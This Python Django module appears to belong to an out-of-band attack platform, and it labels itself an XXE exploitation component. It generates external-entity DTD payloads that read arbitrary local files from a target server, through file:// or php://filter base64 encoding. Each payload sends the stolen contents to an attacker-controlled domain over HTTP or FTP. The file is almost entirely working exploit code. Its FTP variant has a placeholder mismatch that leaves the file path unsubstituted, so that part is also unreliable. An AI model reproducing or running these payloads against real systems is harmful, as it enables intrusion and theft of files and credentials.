from django.http import HttpResponse
from modules.template.depend.base import BaseTemplate
from rest_framework.response import Response


class XxeTemplate(BaseTemplate):
    info = [{
        "template_info": {
            "name": "XXE",  # 组件名
            "title": "XXE漏洞利用组件",  # 组件展示标题名
            "author": "bios000",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": """<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://{domain}/{key}"> %remote;%int;%send; ]>""",
            "file_name": "xxe.py"
        },
        "item_info": [{
            "name": "ftp_xxe_read_file",
            "config": ["path"],
        },
            {
                "name": "xxe_read_file",
                "config": ["path"],
            },
            {
                "name": "php_xxe_read_file",
                "config": ["path"],
            },

        ],
    }]

    def __init__(self):
        super().__init__()
        self.key = None

    def ftp_xxe_read_file(self, item):
        """
        读取文件
        """
        read_file_code = """<!ENTITY % file SYSTEM "file://{path}">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://{{key}}:123@{{domain}}:21/%file;'>"> """
        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
            "config"]["path"])
        return code

    def xxe_read_file(self, item):
        """
        读取文件
        """
        read_file_code = """<!ENTITY % file SYSTEM "file://{{path}}">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://{{domain}}/{{key}}?message=%file;'>"> """
        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
            "config"]["path"])
        return code

    def php_xxe_read_file(self, item):
        """
        读取文件
        """
        read_file_code = """<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://{{path}}">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://{{domain}}/{{key}}?message=%file;'>"> """
        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
            "config"]["path"])
        return code

    def generate(self, key, config):
        code = ''
        self.key = key
        try:
            for i in config:
                item_name = i["name"]
                for name in self.__dir__():
                    if name == item_name:
                        code = code + getattr(self, name)(i)
            return HttpResponse(code, content_type='application/xhtml+xml')
        except Exception as e:
            import traceback
            traceback.print_exc()
            return Response({'status': 'false', 'message': '操作失败'})
